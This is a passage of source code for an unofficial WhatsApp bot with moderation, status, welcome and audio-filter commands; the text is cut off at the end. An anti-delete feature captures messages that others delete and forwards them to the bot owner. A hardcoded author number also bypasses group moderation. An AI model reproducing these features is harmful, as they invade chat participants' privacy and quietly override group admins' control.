/*
 * © 2026 SeXyxeon (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://youtube.com/@voidsec7718
 * Instagram : sabir._7718
 * Telegram  : https://t.me/SABIR7718
 * GitHub    : https://github.com/SABIR7718
 * WhatsApp  : +91 73650 85213
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */

/*let require

try {
  const { createRequire } = await import("module")
  require = createRequire(import.meta.url)
} catch {
  require = global.require
}*/

const fs = require('fs');
const path = require('path');
const os = require('os');
const axios = require('axios');
const yts = require('yt-search');
const config = require('./config');
const { log } = require("@sabir7718/log");
const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
const { writeFile } = require('fs/promises');
//const cron = require('node-cron');
const moment = require('moment-timezone');
const { exec } = require('child_process');

const songPath = './Love/song/';
if (!fs.existsSync(songPath)) fs.mkdirSync(songPath, { recursive: true });


if (!global.msgStore) global.msgStore = new Map(); 
const tempDir = path.join(process.cwd(), 'tmp');
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

/*const dbPath = path.join(process.cwd(), 'Love', 'database.json');
let memoryDB = null;


const getDB = () => {
    if (memoryDB) return memoryDB;
    if (!fs.existsSync(dbPath)) {
        memoryDB = {}; 
        return memoryDB;
    }
    try {
        memoryDB = JSON.parse(fs.readFileSync(dbPath));
    } catch {
        memoryDB = {};
    }
    return memoryDB;
};

const saveDB = (data) => {
    memoryDB = data; 
    fs.writeFile(dbPath, JSON.stringify(data, null, 2), (err) => {
        if (err) console.error("DB Save Error:", err);
    });
};*/

// SY love Here 🤗 ❤️‍🩹 

const owneronly = '❌ *Owner Only Command!*';
const onlygc = "❌ *This command only works in groups!*";
const statusDir = path.join(process.cwd(), 'Love', 'status');

setInterval(async () => {
    try {
        if (!fs.existsSync(statusDir)) return;
        const files = fs.readdirSync(statusDir);
        const now = Date.now();
        const expiry = 24 * 60 * 60 * 1000;

        files.forEach(file => {
            const filePath = path.join(statusDir, file);
            const stats = fs.statSync(filePath);
            if (now - stats.mtimeMs > expiry) {
                fs.unlinkSync(filePath);
            }
        });

        let db = getDB();
        if (db.statusVault) {
            Object.keys(db.statusVault).forEach(botNum => {
                db.statusVault[botNum] = db.statusVault[botNum].filter(s => (now - s.timestamp) < expiry);
            });
            if (typeof saveDB === 'function') saveDB(db);
        }
    } catch (err) {
        console.error("Auto-Delete Error:", err);
    }
}, 60 * 60 * 1000);


const formatSize = (bytes) => {
    const units = ['B', 'KB', 'MB', 'GB', 'TB'];
    let i = 0;
    while (bytes >= 1024 && i < units.length - 1) {
        bytes /= 1024;
        i++;
    }
    return `${bytes.toFixed(2)} ${units[i]}`;
};

const S7_RUNTIME_KEY = 'S7_runtime_start';

const S7_initRuntime = (db, saveDB) => {
    if (!db[S7_RUNTIME_KEY] || typeof db[S7_RUNTIME_KEY] !== 'number') {
        db[S7_RUNTIME_KEY] = Date.now();
        saveDB(db);
    }
    return db[S7_RUNTIME_KEY];
};

const getRuntime = (db, saveDB) => {
    let t = Math.floor((Date.now() - S7_initRuntime(db, saveDB)) / 1000);

    const d = Math.floor(t / 86400);
    t %= 86400;
    const h = Math.floor(t / 3600);
    t %= 3600;
    const m = Math.floor(t / 60);
    const s = t % 60;

    const parts = [];
    if (d) parts.push(`${d}d`);
    if (h) parts.push(`${h}h`);
    if (m) parts.push(`${m}m`);
    if (s || parts.length === 0) parts.push(`${s}s`);

    return parts.join(' ');
};

const S7_resetRuntime = () => {
    let db = getDB();
    db[S7_RUNTIME_KEY] = Date.now();
    saveDB(db);
};

const LOVE_SY_S7 = async (SYxS7, m, jid, waSessions = {}) => {
        try {
        const S7 = (m && m.messages && m.messages[0]) ? m.messages[0] : null;
        const from = jid || (S7 ? S7.key.remoteJid : null);        
        const botNumber = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';
        const dbFolder = path.join(process.cwd(), "Love", "database");
if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
}

let BotNumber = botNumber;

const getDBPath = (number) => {
    const clean = number.split("@")[0].replace(/[^0-9]/g, '');
    return path.join(dbFolder, `${clean}.json`);
};

const getDB = () => {
    if (!BotNumber) return {};
    const filePath = getDBPath(BotNumber);
    const backupPath = filePath + ".backup";

    if (!fs.existsSync(filePath)) {
        const empty = {};
        fs.writeFileSync(filePath, JSON.stringify(empty, null, 2));
        return empty;
    }

    try {
        return JSON.parse(fs.readFileSync(filePath, "utf-8"));
    } catch (err) {
        if (fs.existsSync(backupPath)) {
            try {
                const backup = JSON.parse(fs.readFileSync(backupPath, "utf-8"));
                fs.writeFileSync(filePath, JSON.stringify(backup, null, 2));
                return backup;
            } catch {}
        }
        const empty = {};
        fs.writeFileSync(filePath, JSON.stringify(empty, null, 2));
        return empty;
    }
};

const SABIR7718_MENU = require('./SY/menu');

const saveDB = (data) => {
    if (!BotNumber || !data) return;
    const filePath = getDBPath(BotNumber);
    const tempPath = filePath + ".tmp";
    const backupPath = filePath + ".backup";

    try {
        fs.writeFileSync(tempPath, JSON.stringify(data, null, 2));
        fs.renameSync(tempPath, filePath);

        if (Math.random() < 0.1) {
            fs.copyFileSync(filePath, backupPath);
        }
    } catch (err) {}
};
const db = getDB();
        const S7user = S7?.pushName || S7?.verifiedName || (S7?.key?.participant ? S7.key.participant.split('@')[0] : "User");
        const type = (S7 && S7.message) ? Object.keys(S7.message)[0] : null;
        // const SYHaTeReplay = async (content, options = {}) => {
                // const messageContent = typeof content === 'string' ? { text: content } : content;
                // return await SYxS7.sendMessage(from, {
                    // ...messageContent,
                    // contextInfo: {
                        // forwardingScore: 999,
                        // isForwarded: true,
                        // forwardedNewsletterMessageInfo: {
                            // newsletterJid: '120363424694018029@newsletter',
                            // newsletterName: '【 BY DEATHLINE 💀】',
                            // serverMessageId: -1
                        // },
                        // ...options
                    // }
                // }, { quoted: S7 });
            // };
            







            const SYHaTeReplayB = async (content, options = {}) => {
    const messageContent = typeof content === 'string' ? { text: content } : content;
    let db = getDB();
    const botNumber = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';
    const quoteEnabled = db[botNumber]?.quote !== false;
    
    const viewChannelEnabled = db[botNumber]?.viewchannel === true;
    const customName = db[botNumber]?.channelName || '【 BY DEATHLINE 💀】';
    const customJid = db[botNumber]?.newsletterJid || '120363424694018029@newsletter';

    if (viewChannelEnabled) {
        return await SYxS7.sendMessage(from, {
            ...messageContent,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: customJid,
                    newsletterName: customName,
                    serverMessageId: -1
                },
                ...options
            }
        }, { quoted: quoteEnabled ? S7 : null });
    } else {
        return await SYxS7.sendMessage(from, {
            ...messageContent,
            ...options
        }, { quoted: quoteEnabled ? S7 : null });
    }
};

            const SYHaTeReplayS7 = async (content, options = {}) => {
    const messageContent = typeof content === 'string' ? { text: content } : content;
    let db = getDB();
    const botNumber = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';
    const quoteEnabled = db[botNumber]?.quote !== false;
    
    const viewChannelEnabled = true;
    const customName = db[botNumber]?.channelName || '【 BY DEATHLINE 💀】';
    const customJid = db[botNumber]?.newsletterJid || '120363424694018029@newsletter';

    if (viewChannelEnabled) {
        return await SYxS7.sendMessage(from, {
            ...messageContent,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: customJid,
                    newsletterName: customName,
                    serverMessageId: -1
                },
                ...options
            }
        }, { quoted: quoteEnabled ? S7 : null });
    } else {
        return await SYxS7.sendMessage(from, {
            ...messageContent,
            ...options
        }, { quoted: quoteEnabled ? S7 : null });
    }
};

const S7HaTeSTArTEd = async (content, options = {}) => {
    const messageContent = typeof content === 'string' ? { text: content } : content;
    let db = getDB();
    const botNumber = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';
    
    const targetJid = options.from || (typeof from !== 'undefined' ? from : null) || S7?.key?.remoteJid || botNumber;

    const viewChannelEnabled = db[botNumber]?.viewchannel === true;
    const customName = db[botNumber]?.channelName || '【 BY DEATHLINE 💀】';
    const customJid = db[botNumber]?.newsletterJid || '120363424694018029@newsletter';
    
    const giftEnabled = db[botNumber]?.giftquote === true; 

    let gift;

    if (giftEnabled) {
        if (S7 && S7.key) {
            gift = {
                key: {
                    remoteJid: S7.key.remoteJid,
                    fromMe: S7.key.fromMe || false,
                    id: S7.key.id,
                    participant: S7.key.participant || S7.key.remoteJid
                },
                message: {
                    contactMessage: {
                        displayName: "⤷ 𝚈𝚘𝚞𝚛 𝚂𝙰𝙱𝙸𝚁⁷⁷¹⁸ ⤶",
                        vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;S7-AGENT;;;\nFN:S7-AGENT\nTEL;type=Mobile;waid=254718382377:+254 718 382377\nEND:VCARD"
                    }
                }
            };
        } else {
            gift = {
                key: {
                    remoteJid: targetJid,
                    fromMe: false,
                    id: 'S7_FAKE_QUOTE_' + Date.now(),
                    participant: targetJid
                },
                message: {
                    contactMessage: {
                        displayName: "⤷ 𝚈𝚘𝚞𝚛 𝚂𝙰𝙱𝙸𝚁⁷⁷¹⁸ ⤶",
                        vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;S7-AGENT;;;\nFN:S7-AGENT\nTEL;type=Mobile;waid=254718382377:+254 718 382377\nEND:VCARD"
                    }
                }
            };
        }
    } else {
        gift = options.quoted || null;
    }

    const contextInfo = {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: customJid,
            newsletterName: customName,
            serverMessageId: -1
        },
        ...options.contextInfo
    };

    try {
        if (viewChannelEnabled) {
            return await SYxS7.sendMessage(targetJid, { ...messageContent, contextInfo }, { quoted: gift });
        } else {
            return await SYxS7.sendMessage(targetJid, { ...messageContent, ...options }, { quoted: gift });
        }
    } catch (e) {
        log('error', 'SYHaTeReplay', 'Message: ' + e.message);
    }
};



const SYHaTeReplay = async (content, options = {}) => {
    let db = getDB();
    const botNumber = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';
    
    const giftEnabled = db[botNumber]?.giftquote === true;

    if (giftEnabled) {
        return await S7HaTeSTArTEd(content, options);
    } else {
        return await SYHaTeReplayB(content, options);
    }
};









const SYHaTeReplay2 = async (content, options = {}) => {
    const messageContent = typeof content === 'string' ? { text: content } : content;
    let db = getDB();
    const botNumber = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';
    
    const viewChannelEnabled = db[botNumber]?.viewchannel === true;
    const customName = db[botNumber]?.channelName || '【 BY DEATHLINE 💀】';

    if (viewChannelEnabled) {
        return await SYxS7.sendMessage(from, {
            ...messageContent,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363424694018029@newsletter',
                    newsletterName: customName,
                    serverMessageId: -1
                }
            },
            ...options
        }, { quoted: S7 });
    } else {
        return await SYxS7.sendMessage(from, {
            ...messageContent,
            ...options
        }, { quoted: S7 });
    }
};


if (m && m.callUpdate) {
    const node = m.callUpdate;
    const botNumber = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';
    const db = getDB();

    if (db[botNumber]?.anticall) {
        if (node.status === 'offer') {
            const callerId = node.from;
            const callId = node.id;

            try {
                await SYxS7.sendNode({
                    tag: 'call',
                    attrs: { to: callerId, id: SYxS7.generateMessageTag() },
                    content: [{
                        tag: 'reject',
                        attrs: { 'call-id': callId, 'call-creator': callerId },
                        content: undefined
                    }]
                });

                if (!db[botNumber].callCount) db[botNumber].callCount = {};
                db[botNumber].callCount[callerId] = (db[botNumber].callCount[callerId] || 0) + 1;

                if (db[botNumber].callCount[callerId] >= 3) {
                    const customMsg = db[botNumber]?.anticallMsg || "⚠️ *WARNING:* You have called multiple times.\nPlease wait or send a text message.";
                    
                    await SYHaTeReplay(customMsg);

                    db[botNumber].callCount[callerId] = 0;
                }

                saveDB(db);
                log('info', 'ANTICALL', `Rejected call from: ${callerId}`);
            } catch (err) {
                log('error', 'CRITICAL', `Call Reject Fail: ${err.message}`);
            }
        }
    }
    return;
}

const currentJid = jid || (S7 ? S7.key.remoteJid : null);



            if (currentJid === 'status@broadcast') {
                const autoStatusMode = db[botNumber]?.autostatus;
                
                if (autoStatusMode) {
                    try {
                        const statusKey = {
                            remoteJid: 'status@broadcast',
                            id: S7.key.id,
                            participant: S7.key.participant,
                            addressingMode: 'lid'
                        };
            
                        await SYxS7.readMessages([statusKey]);
                        log('success', 'STATUS', `Auto-Seen Triggered for ${S7user}`);
            
                        if (autoStatusMode === 2 || autoStatusMode === '2') {
                            await SYxS7.sendMessage('status@broadcast', {
                                reactionMessage: {
                                    key: statusKey,
                                    text: "💚",
                                    senderTimestampMs: Date.now().toString()
                                }
                            }, { 
                                statusJidList: [S7.key.participant] 
                            });
                        }
                    } catch (e) { 
                        log('error', 'STATUS_ERR', e.message); 
                    }
                }
                return;
            }

            
const groupUpdate = m.groupUpdate;

if (groupUpdate) {
    const { id, participants, action, author } = groupUpdate;

    if (id?.endsWith("@g.us") && participants?.length) {
        const S7HaTeSY = getDB();

        const SYHaTe =
            (SYxS7.user.id.split(":")[0] || SYxS7.user.id)
                .split("@")[0] + "@s.whatsapp.net";

        if (S7HaTeSY[SYHaTe]?.gevent_status?.[id]) {
            for (const HaTe of participants) {
                const S7 =
                    typeof HaTe === "string"
                        ? HaTe
                        : HaTe.id;

                if (!S7) continue;

                const SABIR7718 = S7.split("@")[0];
                const actionAuthorJid = author || "System";
                const S7HaTe = author ? author.split("@")[0] : "System";

                const SY = author ? [S7, author] : [S7];

                let S7TEXT = "";

                if (action === "promote") {
                    S7TEXT = `*Promoted To Admin.* @${SABIR7718}\n\n*By -* ${author ? `@${S7HaTe}` : '*System*'}`;
                }

                if (action === "demote") {
                    S7TEXT = `*Demoted From Admin* @${SABIR7718}\n\n*By -* ${author ? `@${S7HaTe}` : '*System*'}`;
                }

                if (S7TEXT) {
                    await SYxS7.sendMessage(
                        id,
                        {
                            text: S7TEXT.trim(),
                            mentions: SY
                        }
                    );
                }
            }
        }
    }
}







            
if (m && m.groupUpdate) {
    const anu = m.groupUpdate;
    const from = anu.id;
    const action = anu.action;
    const participants = anu.participants;

    if (!from?.endsWith('@g.us')) return;

    const db = getDB();
    const isWelcome = action === 'add';
    const isGoodbye = action === 'remove';

    if ((isWelcome && db[from]?.welcome) || (isGoodbye && db[from]?.goodbye)) {
        (async () => {
            try {
                const metadata = await SYxS7.groupMetadata(from).catch(() => null);
                if (!metadata) return;

                let mentions = [];
                let userTags = "";

                for (let p of participants) {
                    let jid = typeof p === 'string' ? p : p.id || p;
                    if (jid) {
                        const num = jid.split('@')[0].split(':')[0];
                        userTags += `@${num} `;
                        mentions.push(jid);
                    }
                }

                if (mentions.length === 0) return;

                const isDpOn = isWelcome 
                    ? (db[from]?.welcomedp !== false) 
                    : (db[from]?.goodbyedp !== false);

                let welcomeTnx = db[from].welcomemsg || 
                    `┏━━━━━━───────────────┓\n  ✨ *WELCOME TO THE GROUP* ✨\n┗━━━━━━───────────────┛\n\n👋 *Hello:* {user}\n🏘️ *Group:* {group}\n\n*Enjoy your stay!* 🌹`;

                let goodbyeTnx = db[from].goodbyemsg || 
                    `┏━━━━━━───────────────┓\n  💔 *GOODBYE MEMBER* 💔\n┗━━━━━━───────────────┛\n\n👤 *User:* {user}\n🏘️ *Left from:* {group}\n\n*We will miss you!* 🕊️`;

                let selectedMsg = isWelcome ? welcomeTnx : goodbyeTnx;
                let finalMsg = selectedMsg
                    .replace(/{user}/g, userTags.trim())
                    .replace(/{group}/g, metadata.subject || "Group")
                    .replace(/{description}/g, metadata.desc || 'No Description');

                if (isDpOn && mentions[0]) {
                    let ppUrl;
                    try {
                        ppUrl = await SYxS7.profilePictureUrl(mentions[0], 'image');
                    } catch {
                        ppUrl = 'https://sabir7718.is-a.dev/photos/sayan.jpg';
                    }

                    const res = await axios.get(ppUrl, { responseType: 'arraybuffer' });
                    await SYHaTeReplay({
                        image: Buffer.from(res.data),
                        caption: finalMsg,
                        mentions: mentions
                    });
                } else {
                    await SYHaTeReplay({
                        text: finalMsg,
                        mentions: mentions
                    });
                }

            } catch (e) {
                console.error("Welcome/Goodbye Error:", e);
            }
        })();
    }
}

const isGroup = from.endsWith('@g.us');

if (isGroup && m.groupUpdate) {
    const anu = m.groupUpdate;
    const botNumberOnly = (SYxS7.user.id || '').split(':')[0].split('@')[0];
    const dbKey = botNumberOnly + '@s.whatsapp.net';
    
    const targetGroupId = anu.id || from;
    
    if (!db[dbKey]) db[dbKey] = {};
    if (!db[dbKey].anti_action) db[dbKey].anti_action = {};
    if (!db[dbKey].anti_action[targetGroupId]) db[dbKey].anti_action[targetGroupId] = { promote: false, demote: false };

    const config = db[dbKey].anti_action[targetGroupId];

    if (config && (config.promote || config.demote)) {
        const myLid = (SYxS7.user.lid || '').split(':')[0].split('@')[0];
        const groupMetadata = await SYxS7.groupMetadata(targetGroupId).catch(() => null);
        const participants = groupMetadata?.participants || [];
        const isBotAdmin = participants.some(p => p.id.split('@')[0] === myLid && (p.admin === 'admin' || p.admin === 'superadmin'));

        const action = anu.action || (anu[0] && anu[0].action) || null;
        
        if (isBotAdmin && action) {
            const rawTargets = anu.participants || (anu[0] && anu[0].participants) || [];
            const targets = rawTargets.map(t => {
                const targetStr = String(t.id || t || '');
                return targetStr.includes('@') ? targetStr : `${targetStr.split(':')[0]}@s.whatsapp.net`;
            }).filter(t => t.length > 15);
            
            const rawAuthor = anu.author || (anu[0] && anu[0].author) || '';
            const actorLid = String(rawAuthor.id || rawAuthor || '').split(':')[0].split('@')[0];
            const actorJid = String(rawAuthor.id || rawAuthor || '').includes('@') ? String(rawAuthor.id || rawAuthor || '') : `${actorLid}@s.whatsapp.net`;

            if (actorLid !== myLid) {
                if ((action === 'promote' || action === 'add') && config.promote) {
                    let verifiedAdmins = [];
                    for (let target of targets) {
                        const checkAdmin = participants.some(p => p.id === target && (p.admin === 'admin' || p.admin === 'superadmin'));
                        if (checkAdmin || action === 'promote') {
                            verifiedAdmins.push(target);
                        }
                    }
                    if (verifiedAdmins.length > 0) {
                        for (let targetAdmin of verifiedAdmins) {
                            await SYxS7.groupParticipantsUpdate(targetGroupId, [targetAdmin], "demote").catch(() => {});
                        }
                        if (config.promote === 'kick' && rawAuthor) {
                            await SYxS7.groupParticipantsUpdate(targetGroupId, [actorJid], "remove").catch(() => {});
                        }
                    }
                } else if (action === 'demote' && config.demote) {
                    for (let target of targets) {
                        await SYxS7.groupParticipantsUpdate(targetGroupId, [target], "promote").catch(() => {});
                    }
                    if (config.demote === 'kick' && rawAuthor) {
                        await SYxS7.groupParticipantsUpdate(targetGroupId, [actorJid], "remove").catch(() => {});
                    }
                }
            }
        }
    }
}


if (!S7 || !S7.message) return;

if (db[botNumber]?.antidelete && S7.message && !from.endsWith('@g.us')) {
    const type = Object.keys(S7.message)[0];
    if (type !== 'protocolMessage') {
        if (!db.msgStore) db.msgStore = {};
        db.msgStore[S7.key.id] = S7;
        const msgKeys = Object.keys(db.msgStore);
        if (msgKeys.length >= 150) {
            db.msgStore = {}; 
        }

        saveDB(db);
    }
}

let presenceConfig = db[botNumber]?.presence_settings || { typing: false, recording: false };

if (db[botNumber]?.antidelete && S7.message?.protocolMessage) {
    const protocol = S7.message.protocolMessage;
    
    if (protocol.type === 0 || protocol.type === 'REVOKE' || protocol.type === 3) {
        const deletedId = protocol.key.id;
        const original = db.msgStore ? db.msgStore[deletedId] : null;

        if (original) {
            const myNum = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';
            const victim = (original.key.participant || original.key.remoteJid).split('@')[0];

            let report = `𝙰𝙽𝚃𝙸-𝙳𝙴𝙻𝙴𝚃𝙴\n`;
            report += `──────────────\n\n`;
            report += `𝚄𝚜𝚎𝚛   : @${victim}\n`;
            report += `𝚂𝚝𝚊𝚝𝚞𝚜 : 𝚁𝚎𝚌𝚘𝚟𝚎𝚛𝚎𝚍\n\n`;
            report += `──────────────\n`;
            report += `𝚉𝙾𝚁𝙾 𝙼𝙳`;
            const botLog = await SYxS7.sendMessage(myNum, { 
                text: report, 
                mentions: [original.key.participant || original.key.remoteJid] 
            });
            await SYxS7.sendMessage(myNum, { 
                forward: original 
            }, { 
                quoted: botLog 
            });
            delete db.msgStore[deletedId];
            saveDB(db);
        }
        return;
    }
}



if (db[botNumber]?.autoreact) {
    try {
        const emojis = db[botNumber]?.emojis || ['❤️', '✨', '🔥', '⚡', '👑'];
        const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
        await SYxS7.sendMessage(from, { react: { text: randomEmoji, key: S7.key } });
    } catch (e) {}
}





            const sender = S7.key.participant || S7.key.remoteJid;              
            const prefix = db[botNumber]?.prefix || config.prefix || ".";
            const getBody = () => {
  try {
    if (S7.message?.templateButtonReplyMessage?.selectedId) {
      return S7.message.templateButtonReplyMessage.selectedId;
    }
    if (S7.message?.interactiveResponseMessage?.buttonReply?.id) {
      return S7.message.interactiveResponseMessage.buttonReply.id;
    }
    const native = S7.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson;
    if (native) {
      return JSON.parse(native).id || "";
    }
    return (
      S7.message?.buttonsResponseMessage?.selectedButtonId ||
      S7.message?.listResponseMessage?.singleSelectReply?.selectedRowId ||
      S7.message?.extendedTextMessage?.text ||
      S7.message?.conversation ||
      S7.message?.imageMessage?.caption ||
      S7.message?.videoMessage?.caption ||
      ""
    );

  } catch {
    return "";
  }
};

const body = getBody();

const isCmd = (body && prefix) ? body.startsWith(prefix) : false;
const ownerData = getDB()[botNumber];
            

            const getRawMessage = () => {
  try {
    const native = S7.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson;
    if (native) {
      const parsed = JSON.parse(native);
      if (parsed?.id) return parsed.id;
    }
    if (S7.message?.interactiveResponseMessage?.buttonReply?.id) {
      return S7.message.interactiveResponseMessage.buttonReply.id;
    }
    return (
      S7.message?.templateButtonReplyMessage?.selectedId ||
      S7.message?.buttonsResponseMessage?.selectedButtonId ||
      S7.message?.listResponseMessage?.singleSelectReply?.selectedRowId ||
      S7.message?.extendedTextMessage?.text ||
      S7.message?.conversation ||
      S7.message?.imageMessage?.caption ||
      S7.message?.videoMessage?.caption ||
      ""
    );

  } catch (e) {
    return "";
  }
};

const raw = getRawMessage();

const SYHaTeS7 = raw.startsWith(prefix)
  ? raw.slice(prefix.length).trim().split(/ +/).shift().toLowerCase()
  : "";

const args = raw.startsWith(prefix)
  ? raw.slice(prefix.length).trim().split(/ +/).slice(1)
  : [];

const text = args.join(" ");  
                  

setInterval(async () => {
    let db = getDB();
    const botNumber = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';
    
    if (db[botNumber]?.alwaysOnline) {
        await SYxS7.sendPresenceUpdate('available');
    }
}, 20000);

/*
cron.schedule('* * * * *', async () => {
    let db = getDB();
    const botNumber = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';
    
    if (!db[botNumber]?.schedules || db[botNumber].schedules.length === 0) return;

    const now = moment().tz("Asia/Kolkata");
    let hasChanged = false;

    for (let i = 0; i < db[botNumber].schedules.length; i++) {
        let item = db[botNumber].schedules[i];
        
        if (item.status !== 'pending') continue;

        const target = moment(item.targetTime);

        if (now.isSameOrAfter(target)) {
            item.status = 'processing';
            hasChanged = true;

            try {
                if (item.message) {
                    await S7HaTeSTArTEd(item.message, item.jid);
                }

                if (item.quoted) {
                    await S7HaTeSTArTEd({ forward: item.quoted }, item.jid);
                }

                item.status = 'completed';
                log('info', 'SCHEDULER', `Task executed successfully for: ${item.jid}`);
            } catch (error) {
                item.status = 'failed';
                log('error', 'SCHEDULER', `Execution failed for ${item.jid}: ${error.message}`);
            }
        }
    }

    if (hasChanged) {
        db[botNumber].schedules = db[botNumber].schedules.filter(s => s.status === 'pending');
        saveDB(db);
    }
});
*/






        const msg = S7.message;
        const contextInfo = msg?.extendedTextMessage?.contextInfo || 
                            msg?.imageMessage?.contextInfo || 
                            msg?.videoMessage?.contextInfo || 
                            msg?.documentMessage?.contextInfo;

        const mentioned = contextInfo?.mentionedJid || [];
        
        const isStatusMention = 
            mentioned.includes('0@s.whatsapp.net') || 
            contextInfo?.participant === '0@s.whatsapp.net' || 
            contextInfo?.remoteJid === 'status@broadcast' ||
            contextInfo?.quotedMessage?.statusId; 

        const isMention = mentioned.length > 0 || isStatusMention;

const handleAntiAction = async (from, sender, typeName, S7KeyId) => {
    if (!db[from].antiWarnings) db[from].antiWarnings = {};
    if (!db[from].antiWarnings[sender]) db[from].antiWarnings[sender] = {};
    if (!db[from].antiWarnings[sender][typeName]) db[from].antiWarnings[sender][typeName] = 0;

    const action = db[from][typeName];
    try {
        await SYxS7.sendMessage(from, { 
            delete: { remoteJid: from, fromMe: false, id: S7KeyId, participant: sender } 
        });
    } catch (e) {}

    if (action === 'kick') {
        await SYxS7.groupParticipantsUpdate(from, [sender], 'remove').catch(() => {});
        await SYHaTeReplay(`🚫 *@${sender.split('@')[0]}* has been kicked for violating *${typeName.toUpperCase()}*!`, { mentions: [sender] });
    } 
    else if (action === 'warn') {
        db[from].antiWarnings[sender][typeName] += 1;
        const count = db[from].antiWarnings[sender][typeName];

        if (count >= 3) {
            db[from].antiWarnings[sender][typeName] = 0;
            await SYxS7.groupParticipantsUpdate(from, [sender], 'remove').catch(() => {});
            await SYHaTeReplay(`❌ *@${sender.split('@')[0]}* reached 3 warnings and has been kicked from the group!`, { mentions: [sender] });
        } else {
            await SYHaTeReplay(`⚠️ *[@${sender.split('@')[0]}] WARNING (${count}/3):* Do not send/use *${typeName.replace('anti', '')}* in this group. Next time will lead to kick!`, { mentions: [sender] });
        }
        if (typeof saveDB === 'function') saveDB(db);
    }
};

if (isGroup && db[from]?.antilink && body) {
    const linkPattern = /chat.whatsapp.com|http:\/\/|https:\/\/|www\./gi;
    if (body.match(linkPattern)) {
        const groupMetadata = await SYxS7.groupMetadata(from).catch(() => null);
        const participants = groupMetadata?.participants || [];
        const isSenderAdmin = participants.find(p => p.id === sender)?.admin !== null;
        const isOwner = sender === '917365085213@s.whatsapp.net' || S7.key.fromMe;

        if (!isSenderAdmin && !isOwner) {
            await handleAntiAction(from, sender, 'antilink', S7.key.id);
            return;
        }
    }
}

if (isGroup && db[from]?.antitag && isMention) {
    const isOwner = S7.key.fromMe || sender.split(':')[0].split('@')[0] === '917365085213';
    if (!isOwner) {
        await handleAntiAction(from, sender, 'antitag', S7.key.id);
        return;
    }
}

if (isGroup && db[from]?.antibot && !S7.key.fromMe) {
    const stanzaId = S7.key.id;
    const isBot = (stanzaId.length <= 25 || stanzaId.startsWith("3EB0")) && !stanzaId.startsWith("3A");
    if (isBot) {
        const groupMetadata = await SYxS7.groupMetadata(from).catch(() => null);
        const isSenderAdmin = groupMetadata?.participants?.find(p => p.id === sender)?.admin !== null;
        const isOwner = sender.includes('917365085213') || S7.key.fromMe;

        if (!isSenderAdmin && !isOwner) {
            await handleAntiAction(from, sender, 'antibot', S7.key.id);
            return;
        }
    }
}

if (isGroup && db[from]?.antisticker && !S7.key.fromMe) {
    if (type === 'stickerMessage') {
        const groupMetadata = await SYxS7.groupMetadata(from).catch(() => null);
        const isSenderAdmin = groupMetadata?.participants?.find(p => p.id === sender)?.admin !== null;
        const isOwner = sender.includes('917365085213') || S7.key.fromMe;

        if (!isSenderAdmin && !isOwner) {
            await handleAntiAction(from, sender, 'antisticker', S7.key.id);
            return;
        }
    }
}



if (['deep', 'bass', 'reverse', 'slow', 'tempo', 'nightcore', 'smooth', 'echo', 'robot', 'chipmunk', 'dark', 'blown', 'reverb', 'vapor', 'treble', 'earrape', '8d', 'distort', 'karaoke', 'flanger', 'gate', 'phaser', 'chorus'].includes(SYHaTeS7)) {
    const contextInfo = S7.message?.extendedTextMessage?.contextInfo;
    const quotedMessage = contextInfo?.quotedMessage;
    const audioMessage = quotedMessage?.audioMessage || S7.message?.audioMessage;

    if (!audioMessage) return await SYHaTeReplay("*Reply to an audio message*");

    try {
        let ffmpeg, ffmpegPath;
        try {
            ffmpeg = require('fluent-ffmpeg');
            ffmpegPath = require('ffmpeg-static');
        } catch (e) {
            const { execSync } = require('child_process');
            await SYHaTeReplay("📦 *FFmpeg modules missing!* Installing them automatically, please wait...");
            execSync('npm install fluent-ffmpeg ffmpeg-static --no-audit --no-fund', { stdio: 'inherit' });
            ffmpeg = require('fluent-ffmpeg');
            ffmpegPath = require('ffmpeg-static');
        }

        ffmpeg.setFfmpegPath(ffmpegPath);
        await SYxS7.sendMessage(from, { react: { text: "⏳", key: S7.key } });

        const stream = await downloadContentFromMessage(audioMessage, 'audio');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        const input = path.join(os.tmpdir(), `input_${Date.now()}.mp3`);
        const output = path.join(os.tmpdir(), `output_${Date.now()}.mp3`);
        fs.writeFileSync(input, buffer);

        let filters = [];
        if (SYHaTeS7 === 'deep') filters = ['atempo=1', 'asetrate=44500*2/3'];
        else if (SYHaTeS7 === 'bass') filters = ['equalizer=f=18:width_type=o:width=2:g=14'];
        else if (SYHaTeS7 === 'reverse') filters = ['areverse'];
        else if (SYHaTeS7 === 'slow') filters = ['atempo=0.8'];
